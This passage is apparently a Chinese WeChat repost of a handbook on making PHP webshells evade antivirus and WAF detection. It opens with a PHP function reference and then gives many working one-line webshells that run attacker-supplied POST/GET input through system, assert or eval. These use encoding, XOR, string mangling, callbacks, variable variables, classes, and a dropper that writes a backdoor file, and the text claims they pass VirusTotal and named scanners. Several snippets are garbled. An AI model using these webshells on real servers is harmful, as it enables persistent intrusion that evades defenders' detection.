#  从零学习Webshell免杀手册

upzhu  [ x9sec ](javascript:void\(0\);)

**x9sec** ![]()

微信号 x9sec_com

功能介绍 进行网络安全知识分享，渗透测试，红队蓝队技术分享，安全开发平台开源

____

___发表于_

收录于合集

  
**声明：**
该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本  
公众号无关。  
---  
  
  

  

 **项目简介**

  

这是一本能让你从零开始学习PHP的WebShell免杀的手册

博客地址： https://blog.zgsec.cn/index.php/archives/197/

  

 **项目描述**

##  

# 一、PHP相关资料

  * PHP官方手册： https://www.php.net/manual/zh/

  * PHP函数参考： https://www.php.net/manual/zh/funcref.php

  * 菜鸟教程： https://www.runoob.com/php/php-tutorial.html

  * w3school： https://www.w3school.com.cn/php/index.asp

  * 渊龙Sec安全团队导航： https://dh.aabyss.cn

#

# 二、PHP函数速查

##

## 0# PHP基础

###

### 0.0 PHP基础格式

  *   *   * 

    
    
    <?php    //执行的相关PHP代码?>

这是一个PHP文件的基本形式

###

  *   *   *   *   *   *   *   * 

    
    
    0.1 .=和+=赋值$a = 'a'; //赋值$b = 'b'; //赋值$c = 'c'; //赋值$c .= $a;$c .= $b;  
    echo $c; //cab

###

  * `.=` 通俗的说，就是累积

  * `+=` 意思是：左边的变量的值加上右边的变量的值，再赋给左边的变量

###

### 0.2 数组

 **`array()` 函数用于创建数组**

  *   *   * 

    
    
    $shuzu = array("AabyssZG","AabyssTeam");echo "My Name is " . $shuzu[0] . ", My Team is " . $shuzu[1] . ".";//My Name is AabyssZG, My Team is AabyssTeam.

 **数组可嵌套：**

  *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     $r = 'b[]=AabyssZG&b[]=system';$rce = array();      //用array函数新建数组parse_str($r, $rce); //这个函数下文有讲print_r($rce);$rce 数组输出为：Array (    [b] => Array        (            [0] => AabyssZG            [1] => system        ))

这时候可以这样利用

  *   * 

    
    
    $rce['b'][1](参数);    //提取rce数组中的b数组内容，相当于system(参数)echo $rce['b'][0];    //AabyssZG

 **使用`[]` 定义数组**

  *   *   *   *   *   *   * 

    
    
    $z = ['A','a','b', 'y', 's', 's'];$z[0] = 'A';$z[1] = 'a';$z[2] = 'b';$z[3] = 'y';$z[4] = 's';$z[5] = 's';

这就是基本的一个数组，数组名为z，数组第一个成员为0，以此类推

 **`compact()` 函数用于创建数组创建一个包含变量名和它们的值的数组**

  *   *   *   *   *   *   *   * 

    
    
    $firstname = "Aabyss";$lastname = "ZG";$age = "21";  
    $result = compact("firstname", "lastname", "age");print_r($result);数组输出为：Array ( [firstname] => Aabyss [lastname] => ZG [age] => 21 )

###

### 0.3 连接符

 **`.` 最简单的连接符**

  *   *   * 

    
    
    $str1="hello";$str2="world";echo $str1.$str2;    //helloworld

###

### 0.4 运算符

 **`&` 运算符**

加减乘除应该不用我说了吧

    
    
    ($var & 1)  //如果$var是一个奇数，则返回true；如果是偶数，则返回false

 **逻辑运算符**

特别是 `xor` 异或运算符，在一些场合需要用到

![](https://gitee.com/fuli009/images/raw/master/public/20230624181152.png)

###

### 0.5 常量

 **自定义常量**

  *   *   * 

    
    
     define('-_-','smile');    //特殊符号开头，定义特殊常量define('wo',3.14);const wo = 3;

常量的命名规则

  1. 常量不需要使用 `$` 符号，一旦使用系统就会认为是变量；

  2. 常量的名字组成由字母、数字和下划线组成，不能以数字开头；

  3. 常量的名字通常是以大写字母为主，以区别于变量；

  4. 常量命名的规则比变量要松散，可以使用一些特殊字符，该方式只能使用 `define` 定义；

 **`__FILE__` 常量（魔术常量）**

    
    
    __FILE__ //返回文件的完整路径和文件名  
      
    dirname(__FILE___) //函数返回的是代码所在脚本的路径  
      
    dirname(__FILE__) //返回文件所在当前目录到系统根目录的一个目录结构（不会返回当前的文件名称）

 **其他魔术常量**

    
    
    __DIR__        //当前被执行的脚步所在电脑的绝对路径  
    __LINE__       //当前所示的行数  
    __NAMESPACE__  //当前所属的命名空间  
    __CLASS__      //当前所属的类  
    __METHOD__     //当前所属的方法

###

### 0.6 PHP特性

  * PHP中函数名、方法名、类名不区分大小写，常量和变量区分大小写

  * 在某些环境中，`<?php ?>` 没有闭合会导致无法正常运作

###

### 0.7 PHP标记几种写法

其中第一和第二种为常用的写法

    
    
    第一种：<?php ?>  
    第二种：<?php  
    第三种：<? ?>  
    第四种：<% %>  
    第五种：<script language="php"></script>

第三种和第四种为短标识，当使用他们需要开启 `php.ini` 文件中的 `short_open_tag` ，不然会报错

##

## 1# 回调类型函数

###

### 1.0 Tips

在PHP的WebSehll免杀测试过程中，使用回调函数可以发现查杀引擎对函数和函数的参数是否有对应的敏感性

  *   *   *   * 

    
    
    array_map('system', array('whoami'));        //被查杀array_map($_GET['a'], array('whoami'));      //被查杀array_map('var_dump', array('whoami'));      //未被查杀array_map('system', array($_GET['a']));      //被查杀

这里在列举一些回调函数，感兴趣可以自行查找：

  *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    array_filter() array_walk()  array_map()array_reduce()array_walk_recursive()call_user_func_array()call_user_func()filter_var() filter_var_array() registregister_shutdown_function()register_tick_function()forward_static_call_array()uasort() uksort() 

###

### 1.1 array_map()

 **`array_map()` 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新的值的数组**

Demo：将函数作用到数组中的每个值上，每个值都乘以本身，并返回带有新的值的数组：

  *   *   *   *   *   *   *   * 

    
    
    function myfunction($v){return($v*$v);} $a=array(1,2,3,4,5);    //array(1,4,9,16,25)print_r(array_map("myfunction",$a));  
    

### 1.2 register_shutdown_function()

 **`register_shutdown_function()` 函数是来注册一个会在PHP中止时执行的函数**

PHP中止的情况有三种：

  * 执行完成

  * exit/die导致的中止

  * 发生致命错误中止

Demo：后面的after并没有输出，即 `exit` 或者是 `die` 方法导致提前中止

  *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    function test() {  echo '这个是中止方法test的输出'; }   register_shutdown_function('test');   echo 'before' . PHP_EOL; exit(); echo 'after' . PHP_EOL;输出：before 
    
    
    这个是中止方法test的输出

###

### 1.3 array_walk()

 **`array_walk()` 函数对数组中的每个元素应用用户自定义函数**

Demo：这个很简单，直接看就明白了

  *   *   *   *   *   *   *   *   *   * 

    
    
    function myfunction($value,$key,$p){echo "The key $key $p $value<br>";}$a=array("a"=>"red","b"=>"green","c"=>"blue");array_walk($a,"myfunction","has the value");输出：The key a has the value redThe key b has the value greenThe key c has the value blue

###

### 1.4 array_filter()

 **`array_filter()` 函数用回调函数过滤数组中的元素**

该函数把输入数组中的每个键值传给回调函数：如果回调函数返回 true，则把输入数组中的当前键值返回给结果数组（数组键名保持不变）

  *   *   *   *   *   *   *   *   *   * 

    
    
    Demo：function test_odd($var){    return($var & 1);} $a1=array("a","b",2,3,4);print_r(array_filter($a1,"test_odd"));输出：Array ( [3] => 3 )

##

## 2# 字符串处理类函数

###

### 2.0 Tips

可以自己定义函数，组成字符串的拼接方式，比如：

  *   *   *   *   *   *   *   *   *   * 

    
    
    function confusion($a){    $s = ['A','a','b', 'y', 's', 's', 'T', 'e', 'a', 'm'];    $tmp = "";    while ($a>10) {        $tmp .= $s[$a%10];        $a = $a/10;    }    return $tmp.$s[$a];}echo confusion(976534);         //sysTem（高危函数）

这时候，给 `$a` 传参为 `976534` 即可拼接得 `system`

同样，还有很多字符串处理类的函数，可以参考如下：

  *   *   *   *   *   *   *   *   *   * 

    
    
    trim()           //从字符串的两端删除空白字符和其他预定义字符ucfirst()        //把字符串中的首字符转换为大写ucwords()        //把字符串中每个单词的首字符转换为大写strtoupper()     //把字符串转换为大写strtolower()     //把字符串转换为小写strtr()          //转换字符串中特定的字符substr_replace() //把字符串的一部分替换为另一个字符串substr()         //返回字符串的一部分strtok()         //把字符串分割为更小的字符串str_rot13()      //对字符串执行 ROT13 编码

### 2.1 substr()

 **`substr()` 函数返回字符串的一部分**

Demo：相当于截取字段固定长度和开头的内容

  *   * 

    
    
    echo substr("D://system//451232.php", -10, 6)."<br>";   //451232echo substr("AabyssTeam", 0, 6)."<br>";                 //Aabyss
    
    
      
    

###

### 2.2 intval()

 **`intval()` 获取变量的整数值**

    
    
    int intval(var,base)   //var指要转换成 integer 的数量值,base指转化所使用的进制 

如果 base 是 0，通过检测 var 的格式来决定使用的进制：

  * 如果字符串包括了 `0x` (或 `0X`) 的前缀，使用 16 进制 (hex)；

  * 否则，如果字符串以 `0` 开始，使用 8 进制(octal)；

  * 否则，将使用 10 进制 (decimal)

 **成功时返回 var 的 integer 值，失败时返回 0。空的 array 返回 0，非空的 array  返回 1**

Demo：获取对应的整数值

  *   *   *   * 

    
    
    echo intval(042);      // 34echo intval(0x1A);     // 26echo intval(42);       // 42echo intval(4.2);      // 4

###

### 2.3 parse_str()

 **`parse_str()` 函数把查询字符串解析到变量中**

Demo：这个也很简单，看看例子就明白了

  *   *   *   *   *   * 

    
    
    parse_str("name=Peter&age=43");echo $name."<br>";      //Peterecho $age;              //43  
    parse_str("name=Peter&age=43",$myArray);print_r($myArray);       //Array ( [name] => Peter [age] => 43 )
    
    
      
    

##

## 3# 命令执行类函数

###

### 3.0 Tips

命令执行类函数在”某些情况“下是非常危险的，所以往往遭到杀毒软件和WAF的重点关注，所以在做免杀的时候，为了绕过污点检测往往都要将命令执行类函数进行拼接、重组、加密、混淆来规避查杀。

###

### 3.1 eval()

 **`eval()` 函数把字符串按照 PHP 代码来计算，即执行PHP代码**

Demo：将其中的内容按照PHP代码执行

  *   *   *   * 

    
    
    echo 'echo "我想学php"';     //echo "我想学php"eval('echo "我想学php";');   //"我想学php"Demo：一句话木马将参数传到 eval()  函数内执行@eval($_POST['AabyssTeam']);

###

### 3.2 system()

 **`system()` 函数的主要功能是在系统权限允许的情况下，执行系统命令（Windows系统和Linux系统均可执行）**

Demo：执行Whoami并回显

  *   * 

    
    
    system('whoami');  
    

### 3.3 exec()

 **`exec()` 函数可以执行系统命令，但它不会直接输出结果，而是将执行的结果保存到数组中**

Demo：将 `exec()` 函数执行的结果导入result数组

  *   * 

    
    
    exec( 'ls' , $result );print_r($result);        //Array ( [0] => index.php )

### 3.4 shell_exec()

 **`shell_exec()` 函数可以执行系统命令，但不会直接输出执行的结果，而是返回一个字符串类型的变量来存储系统命令的执行结果**

Demo：执行 `ls` 命令

  * 

    
    
    echo shell_exec('ls');    //index.php

###

### 3.5 passthru()

 **`passthru()` 函数可以执行系统命令并将执行结果输出到页面中**

与 `system()` 函数不同的是，它支持二进制的数据，使用时直接在参数中传递字符串类型的系统命令即可

Demo：执行 `ls` 命令

  * 

    
    
    passthru('ls');    //index.php

###

### 3.6 popen()

 **`popen()` 函数可以执行系统命令,但不会输出执行的结果，而是返回一个资源类型的变量用来存储系统命令的执行结果**

故需要配合 `fread()` 函数来读取命令的执行结果

Demo：执行 `ls` 命令

  *   * 

    
    
    $result = popen('ls', 'r');    //参数1:执行ls命令 参数2:字符串类型echo fread($result, 100);      //参数1:上面生成的资源 参数2:读取100个字节

### 3.7 反引号``

 **反引号可以执行系统命令但不会输出结果，而是返回一个字符串类型的变量用来存储系统命令的执行结果**

可单独使用，也可配合其他命令执行函数使用来绕过参数中的过滤条件

Demo：执行 `ls` 命令

  * 

    
    
    echo `ls`;    //index.php

##

## 4# 文件写入类函数

###

### 4.0 Tips

在Webshell的免杀过程中，一部分人另辟蹊径：通过执行一个执行内容为”写入恶意PHP“的样本来绕过查杀，执行成功后会在指定目录写入一个恶意PHP文件，最后通过连接那个恶意PHP文件获得WebShell

###

### 4.1 fwrite()

 **`fwrite()` 函数是用于写入文件，如果成功执行，则返回写入的字节数；失败，则返回 FALSE**

Demo：将 `Hello World. Testing!` 写入 `test.txt`

  *   *   * 

    
    
    $file = fopen("test.txt","w");echo fwrite($file,"Hello World. Testing!");    //21fclose($file);

### 4.2 file_put_contents()

 **`file_put_contents()` 函数把一个字符串写入文件中**

如果文件不存在，将创建一个文件

Demo：使用 `FILE_APPEND` 标记，可以在文件末尾追加内容

  *   *   * 

    
    
    $file = 'sites.txt';$site = "\nGoogle";file_put_contents($file, $site, FILE_APPEND);

同时该函数可以配合解密函数写入文件，比如：

  *   * 

    
    
    $datatest = "[文件的base64编码]";file_put_contents('./要写入的文件名', base64_decode($datatest));

## 5# 异常处理类函数

###

### 5.0 Tips

在PHP的异常处理中，异常处理的相关函数引起了安全行业人员的注意，可以构造相关的异常处理，来绕过WAF的识别和检测。

###

### 5.1 Exception 类

`Exception` 类是php所有异常的基类，这个类包含如下方法：

  *   *   *   *   *   *   *   * 

    
    
    __construct  //异常构造函数getMessage   //获取异常消息内容getPrevious  //返回异常链中的前一个异常，如果不存在则返回null值getCode      //获取异常代码getFile      //获取发生异常的程序文件名称getLine      //获取发生异常的代码在文件中的行号getTrace     //获取异常追踪信息，其返回值是一个数组getTraceAsString //获取字符串类型的异常追踪信息

写个简单的例子方便理解：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    // 创建一个有异常处理的函数function checkNum($number){    if($number>1)    {        throw new Exception("变量值必须小于等于 1");    }        return true;}// 在 try 块 触发异常try{    checkNum(2);    // 如果抛出异常，以下文本不会输出    echo '如果输出该内容，说明 $number 变量';}// 捕获异常catch(Exception $e){    echo 'Message: ' .$e->getMessage() . "<br>" ;     echo "错误信息：" . $e->getMessage() . "<br>";    echo "错误码：" . $e->getCode() . "<br>";    echo "错误文件：" . $e->getFile() . "<br>";    echo "错误行数：" . $e->getLine() . "<br>";    echo "前一个异常：" . $e->getPrevious() . "<br>";    echo "异常追踪信息：";    echo "" . print_r($e->getTrace(), true) . "<br>";    echo "报错内容输出完毕";}

运行后输出结果：

  *   *   *   *   *   *   *   *   * 

    
    
    Message: 变量值必须小于等于 1错误信息：变量值必须小于等于 1错误码：0错误文件：D:\phpstudy_pro\WWW\AabyssZG\error.php错误行数：7前一个异常：异常追踪信息：Array ( [0] => Array ( [file] => D:\phpstudy_pro\WWW\AabyssZG\error.php [line] => 14 [function] => checkNum [args] => Array ( [0] => 2 ) ) )报错内容输出完毕...

##

## 6# 数据库连接函数

###

### 6.0 Tips

可以尝试通过读取数据库内的内容，来获取敏感关键词或者拿到执行命令的关键语句，就可以拼接到php中执行恶意的代码了。

###

### 6.1 Sqlite数据库

配合我上面写的 `file_put_contents()` 文件写入函数，先写入本地Sqlite文件然后读取敏感内容

  *   *   *   *   *   *   *   * 

    
    
    $path = "AabyssZG.db";$db = new PDO("sqlite:" . $path);//连接数据库后查询敏感关键词$sql_stmt = $db->prepare('select * from test where name="system"');$sql_stmt->execute();//提权敏感关键词并进行拼接$f = substr($sql_stmt->queryString, -7, 6);$f($_GET['aabyss']);       //system($_GET['aabyss']);

### 6.2 MySQL数据库

这里使用 `MySQLi()` 这个函数，其实PHP有很多MySQL连接函数，可自行尝试

然后通过这个函数，连接公网数据库（只要目标能出网），即可连接并获得敏感字符拼接到php中

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    function coon($sql) {    $mysqli = new MySQLi("localhost", "test", "test123", "test");    //默认的 MySQL的类，其属性与方法见手册    if ($mysqli - > connect_error) {        //connect_error为属性，报错        die("数据库连接失败：".$mysqli - > connect_errno. "--".$mysqli - > connect_error);        // connect_errno:错误编号    }    $mysqli - > select_db("test"); //选择数据库    // 返回值 $res 为资源类型（获取到结果的资源类型）    $res = $mysqli - > query($sql) or die($mysqli - > error);    //释放结果集，关闭连接    $mysqli - > close();}$sql = "select * from test where name LIKE 'system'";$arr = coon($sql);$res = array("data" => $arr);echo json_encode($res);

##

## 7# PHP过滤器

![](https://gitee.com/fuli009/images/raw/master/public/20230624181154.png)

#

# 三、Webshell免杀

##

## 学习后的免杀效果

学习本手册后，可以达到如下效果，当然这只是拿其中的一个简单的例子进行测试的，感兴趣的可以深入学习并自由组合

####

#### 牧云Webshell检测引擎：

![](https://gitee.com/fuli009/images/raw/master/public/20230624181155.png)

####

#### 微步在线云沙箱：

![](https://gitee.com/fuli009/images/raw/master/public/20230624181156.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230624181157.png)

####

#### 河马WebShell在线查杀：

![](https://gitee.com/fuli009/images/raw/master/public/20230624181158.png)

####

#### 百度WEBDIR+在线查杀：

![](https://gitee.com/fuli009/images/raw/master/public/20230624181159.png)

####

#### 大名鼎鼎的VirusTotal：

![](https://gitee.com/fuli009/images/raw/master/public/20230624181200.png)

##

## 0# 免杀思路概述

首先，要知己知彼，才能针对性做出策略来使得WebShell成功免杀

###

### 0.1 WebShell查杀思路

对于WebShell的查杀思路，大致有以下几种：

  * 分析统计内容（传统）：可以结合字符黑名单和函数黑名单或者其他特征列表（例如代码片段的Hash特征表），之后通过对文件信息熵、元字符、特殊字符串频率等统计方式发现WebShell。

  * 语义分析（AST）：把代码转换成AST语法树，之后可以对一些函数进行调试追踪，那些混淆或者变形过的webshell基本都能被检测到。但是对于PHP这种动态特性很多的语言，检测就比较吃力，AST是无法了解语义的。

  * 机器学习（AI）：这种方法需要大量的样本数据，通过一些AI自动学习模型，总结归类Webshell的特征库，最终去检测Webshell。

  * 动态监控（沙箱）：采用RASP方式，一旦检测到有对应脚本运行，就去监控（Hook）里边一些危险函数，一但存在调用过程将会立刻阻止。这种阻止效果是实时的，这种方法应该是效果最好的，但是成本十分高昂。

###

### 0.2 WebShell整体免杀思路

而对于最常见也是最简单的WebShell，即一句话木马，都是以下形式存在的：

![](https://gitee.com/fuli009/images/raw/master/public/20230624181201.png)

 **而我们要做的是：通过PHP语言的动态特性，灵活利用各种PHP函数和特性，混淆和变形中间两部分内容，从而达到免杀**

###

### 0.3 WebShell免杀注意点

####

#### 0.3.1 `eval()` 高危函数

`eval()` 不能作为函数名动态执行代码，官方说明如下：eval 是一个语言构造器而不是一个函数，不能被可变函数调用

> 可变函数：通过一个变量获取其对应的变量值，然后通过给该值增加一个括号 ()，让系统认为该值是一个函数，从而当做函数来执行

人话：`eval()` 函数不能通过拼接、混淆来进行执行，只能通过明文直接写入

####

#### 0.3.2  ` assert()` 高危函数

在PHP7 中，` assert ()` 也不再是函数了，变成了一个语言结构（类似于
eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点，这个感兴趣可以自行了解即可

所以在WebShell免杀这块，我还是更喜欢用 ` system()` 高危函数，以下很多案例都是使用 ` system()` 来最终执行的

###

### 0.4 WebShell免杀测试

  * 渊龙Sec团队导航（上面啥都有）： https://dh.aabyss.cn/

  * VirusTotal： https://www.virustotal.com/gui/home/upload

  * 河马WebShell查杀： https://n.shellpub.com/

  * 微步在线云沙箱： https://s.threatbook.com/

  * 百度WEBDIR+： https://scanner.baidu.com/

  * 长亭牧云查杀： https://stack.chaitin.com/security-challenge/webshell/index

  * 阿里伏魔引擎： https://xz.aliyun.com/zues

  * D盾： http://www.d99net.net/

  * 网站安全狗： http://free.safedog.cn/website_safedog.html

##

## 1# 编码绕过

这算是早期的免杀手法，可以通过编码来绕过WAF的检测，如下：

###

### 1.1 Base64编码

  *   *   *   * 

    
    
    <?php$f = base64_decode("YX____Nz__ZX__J0");  //解密后为assert高危函数$f($_POST[aabyss]);                      //assert($_POST[aabyss]);?>

###

### 1.2 ASCII编码

  *   *   *   *   * 

    
    
    <?php//ASCII编码解密后为assert高危函数$f =  chr(98-1).chr(116-1).chr(116-1).chr(103-2).chr(112+2).chr(110+6);$f($_POST['aabyss']);                //assert($_POST['aabyss']);?>

###

### 1.3 ROT13编码

  *   * 

    
    
    $f = str_rot13('flfgrz');  //解密后为system高危函数$f($_POST['aabyss']);      //system($_POST['aabyss']);

当然还有很多其他的编码和加密方式，但常见的编码方式都被放入敏感名单了，会根据加密的形式自动进行解密

可以考虑一些比较冷门的编码方式，或者写一个类似于凯撒密码的加密函数，来对WAF进行ByPass

###

### 1.4 Gzip压缩加密

我先举一个 `phpinfo()` 加密后的示例：

    
    
    /*Protected by AabyssZG*/  
    eval(gzinflate(base64_decode('40pNzshXKMgoyMxLy9fQtFawtwMA'))); 

加密手法可以看我写的博客： https://blog.zgsec.cn/index.php/archives/147/

##

## 2# 字符串混淆处理绕过

###

### 2.1 自定义函数混淆字符串

通过对上面所说两部分敏感内容的拼接、混淆以及变换，来绕过WAF的检测逻辑，如下：

  *   *   *   *   *   *   *   *   *   *   * 

    
    
    function confusion($a){    $s = ['A','a','b', 'y', 's', 's', 'T', 'e', 'a', 'm'];    $tmp = "";    while ($a>10) {        $tmp .= $s[$a%10];        $a = $a/10;    }    return $tmp.$s[$a];}$f = confusion(976534);         //sysTem（高危函数）$f($_POST['aabyss']);           //sysTem($_POST['aabyss']);

### 2.2 自定义函数+文件名混淆

同样，可以配合文件名玩出一些花活，我们建一个PHP名字为 `976534.php`：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    function confusion($a){    $s = ['a','t','s', 'y', 'm', 'e', '/'];    $tmp = "";    while ($a>10) {        $tmp .= $s[$a%10];        $a = $a/10;    }    return $tmp.$s[$a];}  
    $f = confusion(intval(substr(__FILE__, -10, 6)));   //sysTem（高危函数）//__FILE__为976534.php//substr(__FILE__, -10, 6)即从文件名中提取出976534//confusion(intval(976534))即输出了sysTem（高危函数），拼接即可$f($_POST['aabyss']);        //sysTem($_POST['aabyss']);

首先先读取文件名，从 `976534.php` 文件名中提取出 `976534` ，然后带入函数中就成功返还 `sysTem`
高危函数了，可以配合其他姿势一起使用，达成免杀效果

###

### 2.3 特殊字符串

主要是通过一些特殊的字符串，来干扰到杀软的正则判断并执行恶意代码（各种回车、换行、null和空白字符等）

  *   *   * 

    
    
    $f = 'hello';$$z = $_POST['aabyss'];eval(``.$hello);

## 3# 生成新文件绕过

这是我之前写的一个免杀，其实原理也很简单，该PHP本身没法执行命令，但是运行后可以在同目录混淆写入一个WebShell，也是可以进行免杀的：

  *   *   *   *   * 

    
    
    $hahaha = strtr("abatme","me","em");      //$hahaha = abatem$wahaha = strtr($hahaha,"ab","sy");       //$wahaha = system（高危函数）$gogogo = strtr('echo "<?php evqrw$_yKST[AABYSS])?>" > ./out.php',"qrwxyK","al(_PO");//$gogogo = 'echo "<?php eval(_POST[AABYSS])?>" > ./out.php'$wahaha($gogogo);  //将一句话木马内容写入同目录下的out.php中

现在看这个是不是很简单，但是这个可是VirusTotal全绿、微步沙箱和百度沙箱都过的哦~

没想到吧~ 其实在这个简单的基础上还可以拓展出来进行高阶免杀操作

##

## 4# 回调函数绕过

通过回调函数，来执行对应的命令，这里举两个例子：

###

### 4.1 call_user_func_array()

  *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    //ASCII编码解密后为assert高危函数$f =  chr(98-1).chr(116-1).chr(116-1).chr(103-2).chr(112+2).chr(110+6);call_user_func_array($f, array($_POST['aabyss']));  
    4.2 array_map()function fun() {    //ASCII编码解密后为assert高危函数  $f =  chr(98-1).chr(116-1).chr(116-1).chr(103-2).chr(112+2).chr(110+6);  return ''.$f;}$user = fun();    //拿到assert高危函数$pass =array($_POST['aabyss']);array_map($user,$user = $pass );

回调函数的免杀早早就被WAF盯上了，像这样单独使用一般都没办法免杀，所以一般都是配合其他手法使用

##

## 5# 可变变量绕过

###

### 5.1 简单可变变量

什么叫可变变量呢？看一下具体例子就明白了：

  *   *   * 

    
    
    $f = 'hello';    //变量名为f，变量值为Hello$$f = 'AabyssZG';  //变量名为Hello（也就是$f的值），值为AabyssZGecho $hello;     //输出AabyssZG

那要怎么利用这个特性呢？如下：

  *   *   * 

    
    
    $f ='hello';$$f = $_POST['aabyss'];eval($hello);   //eval($_POST['aabyss']); 

###

### 5.2 数组+变量引用混淆

上文提到，可以通过 `compact` 创建一个包含变量名和它们的值的数组

那就可以用 `compact` 创建一个包含恶意函数和内容的数组，再引用出来拼接成语句即可

  *   *   *   *   *   *   *   *   * 

    
    
    $z = "system";                        //配合其他姿势，将system高危函数传给z$zhixin  = &$z;$event = 'hahaha';  
    $result = compact("event", "zhixin"); //通过compact创建数组$z = 'wahaha';                        //我将变量z进行修改为'wahaha'  
    $f = $result['zhixin'];$f($_POST['aabyss']);                  //system($_POST['aabyss']); 

根据5.1学到的内容，可以发现传入数组后，函数内容被替换是不会影响数组中的内容的

于是先用变量 `zhixin` 来引用变量 `z` 然后通过 `compact` 创建为数组，接下来再将变量 `z` 附上新的内容 `wahaha`
，传统的WAF追踪变量的内容时候，就会让查杀引擎误以为数组中的值不是 `system` 而是  `wahaha` ，从而达到WebShell免杀

##

## 6# 数组绕过

先将高危函数部分存储在数组中，等到时机成熟后提取出来进行拼接

###

### 6.1 一维数组

  *   *   * 

    
    
    $f = substr_replace("systxx","em",4);         //system（高危函数）$z = array($array = array('a'=>$f($_GET['aabyss'])));var_dump($z);

数组内容如下：

  *   *   *   *   *   * 

    
    
    Array ( [0] => Array ( [a] => assert($_GET['aabyss']) ) )  
    6.2 二维数组$f = substr_replace("systxx","em",4);          //system（高危函数）$z = array($arrayName = ($arrayName = ($arrayName = array('a' => $f($_POST['aabyss'])))));var_dump($z);

##

## 7# 类绕过

通过自定义类或者使用已知的类，将恶意代码放入对应的类中进行执行

###

### 7.1 单类

  *   *   *   *   *   *   *   *   * 

    
    
    class Test{    public $_1='';    function __destruct(){        system("$this->a");    }}$_2 = new Test;$_2->$_1 = $_POST['aabyss'];

###

### 7.2 多类

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    class Test1{    public $b ='';    function post(){        return $_POST['aabyss'];    }}class Test2 extends Test1{    public $code = null;    function __construct(){        $code = parent::post();        system($code);    }}$fff = new Test2;$zzz = new Test1;

主要还是要用一些魔术方法来进行ByPass

##

## 8# 嵌套运算绕过

主要通过各种嵌套、异或以及运算来拼装出来想要的函数，再利用PHP允许动态函数执行的特点，拼接处高危函数名，如 `system` ，然后动态执行恶意代码之即可

###

### 8.1 异或

`^` 为异或运算符，在PHP中两个变量进行异或时，会将字符串转换成二进制再进行异或运算，运算完再将结果从二进制转换成了字符串

  *   *   * 

    
    
    $f = ('.'^']').('$'^']').('.'^']').('4'^'@').('8'^']').(']'^'0');   //system高危函数$f = ('.$.48]' ^ ']]]@]0');   //等同于这样$f($_POST['aabyss']);

这里的话，可以参考国光大佬的Python脚本生成异或结果，然后来替换即可：`python3 xxx.py > results.txt`

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    import stringfrom urllib.parse import quote  
    keys = list(range(65)) + list(range(91,97)) + list(range(123,127))results = []  
      
    for i in keys:    for j in keys:        asscii_number = i^j        if (asscii_number >= 65 and asscii_number <= 90) or (asscii_number >= 97 and asscii_number <= 122):            if i < 32 and j < 32:                temp = (f'{chr(asscii_number)} = ascii:{i} ^ ascii{j} =  {quote(chr(i))} ^ {quote(chr(j))}', chr(asscii_number))                results.append(temp)            elif i < 32 and j >=32:                temp = (f'{chr(asscii_number)} = ascii:{i} ^ {chr(j)} = {quote(chr(i))} ^ {quote(chr(j))}', chr(asscii_number))                results.append(temp)            elif i >= 32 and j < 32:                temp = (f'{chr(asscii_number)} = {chr(i)} ^ ascii{j} = {quote(chr(i))} ^ {quote(chr(j))}', chr(asscii_number))                results.append(temp)            else:                temp = (f'{chr(asscii_number)} = {chr(i)} ^ {chr(j)} = {quote(chr(i))} ^ {quote(chr(j))}', chr(asscii_number))                results.append(temp)  
    results.sort(key=lambda x:x[1], reverse=False)  
    for low_case in string.ascii_lowercase:    for result in results:        if low_case in result:            print(result[0])  
    for upper_case in string.ascii_uppercase:    for result in results:        if upper_case in result:            print(result[0])

###

### 8.2 嵌套运算

其实嵌套运算在WebShell免杀中算是常客了，让我们来看一下一个 `phpinfo()` 的嵌套运算

  *   *   *   *   * 

    
    
    $O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};  
    eval($O00O0O("JE8wTzAwMD0iU0VCb1d4VGJ2SGhRTnFqeW5JUk1jbWxBS1lrWnVmVkpVQ2llYUxkc3J0Z3dGWER6cEdPUFdMY3NrZXpxUnJBVUtCU2hQREdZTUZOT2UZOT25FYmp0d1pwYVZRZEh5Z0NJdnhUSmZYdW9pbWw3N3QvbFg5VEhyT0tWRlpTTSGk4eE1pQVRIazVGcWh4b21UMG5sdTQ9IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));  
    
    
    
    加密手法可以看我写的博客： https://blog.zgsec.cn/index.php/archives/147/

##

## 9# 传参绕过

将恶意代码不写入文件，而是通过传参传入，所以这个比较难以被常规WAF所识别

###

### 9.1 Base64传参

